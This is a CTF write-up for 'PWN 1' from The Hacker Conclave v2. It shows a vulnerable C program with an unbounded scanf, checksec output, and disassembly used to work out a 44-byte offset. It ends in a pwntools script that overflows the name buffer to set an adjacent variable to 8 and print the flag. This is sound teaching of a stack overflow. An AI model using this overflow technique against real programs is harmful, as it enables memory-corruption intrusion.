---
title: "PWN 1 - The Hacker Conclave v2"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "canary", "pie", "lsb", "checksec", "sprintf", "scanf", "stack", "the-hacker-conclave", "the-hacker-conclave-v2", "ctf-writeup"]
summary: "if(!(f=fopen(\"/flag/flag.txt\",\"r\"))){"
source:
  name: "CTFtime writeup #39691"
  url: "https://ctftime.org/writeup/39691"
ctf:
  name: "The Hacker Conclave v2"
  challenge: "PWN 1"
---

## Metadata

- **CTF:** The Hacker Conclave v2
- **Task:** PWN 1
- **Author team:** Sqli Enjoyer
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/39691>

---
# SOURCE FILE  
```  
#include <stdio.h>  
#include <stdlib.h>

void print_flag(){

FILE *f;  
char flag[128];

if(!(f=fopen("/flag/flag.txt","r"))){

if(!(f=fopen("./flag.txt","r"))){  
sprintf(flag,"flag{NOT_A_FLAG}");  
}else{  
fscanf(f,"%s",flag);  
}

}else{  
fscanf(f,"%s",flag);  
}

printf("%s\n",flag);

}

void pwnme(){

int number;  
char name[32];

number=0;

printf("Insert your name: ");

scanf("%s",name);

printf("Welcome home %s\n",name);

if(number == 8){

print_flag();

}

exit(0);

}

void main(){

setbuf(stdout,0);

pwnme();

}  
```

# Info of the binary  
## file pwn  
> pwn: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=4b897bc66104290784341f9c1e42efbbc0c34217, for GNU/Linux 3.2.0, not stripped

A 64-bit executable, being least significant byte (LSB) and not stripped.

## checksec --file=pwn  
>RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE

>Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH 2193 Symbols No 0 0 pwn

For the purpose of this write-up it not going to matter this checksec.

# Exploit

## Let's just make it 8

Analyzing the pwnme. We realize if number would become 8, we just get the flag. So let's do it

### Stack

Because how it is declared number and name. The variable number is below name, because number is put first in the stack. That means, we can override number if we could override the buffer of name. Which we can.

### Idea for exploit 

Becuase there is no form to check the length of name. We can write 32 char and then write the number 8 on number. Of course, because this is pwn this does not work exactly. You see why in the exploit.

### Exploit script

```  
from pwn import *

p = remote("127.0.0.1",11111) # NOT REAL IP NOR PORT

#p = process("./pwn")# if you have the executable

payload = b"a" * 44 + b"\x08"

p.sendlineafter(b"Insert your name:",payload)

p.interactive()  
```

### payload explanation  
Well there is a 44 insted of the theoretical 32. So, what is happening? Some compiling magic. Yeah, i know is because of something called stack aligment, but thats it. Luckly we do not need to know why, but how to get it. You could doing try and error, starting in 32 and starting adding up each time the script does not work. Another option is using some kind of pattern (aaaabaaacaaa....) and with gdb see what value is number after the scanf. For example if number is 0x6b616161 that means that in the pattern "kaaa" is where the number is stored. Or disassembling the function and see how the code is actually working.

#### disassemble pwnme

```  
Dump of assembler code for function pwnme:  
.........  
0x000000000040179e <+30>: call 0x40a300 <printf>  
  
# scanf funcion  
0x00000000004017a3 <+35>: lea rax,[rbp-0x30]  
0x00000000004017a7 <+39>: mov rsi,rax  
0x00000000004017aa <+42>: lea rax,[rip+0x93880] # 0x495031  
0x00000000004017b1 <+49>: mov rdi,rax  
0x00000000004017b4 <+52>: mov eax,0x0  
0x00000000004017b9 <+57>: call 0x40a230 <__isoc99_scanf>  
  
0x00000000004017be <+62>: lea rax,[rbp-0x30]  
.........  
```

As we can see name starts in RBP - 0x30 which is 48. So 48 - 4 (because number is in RBP - 0x4) = 44. And this is the actual length we need to put in.
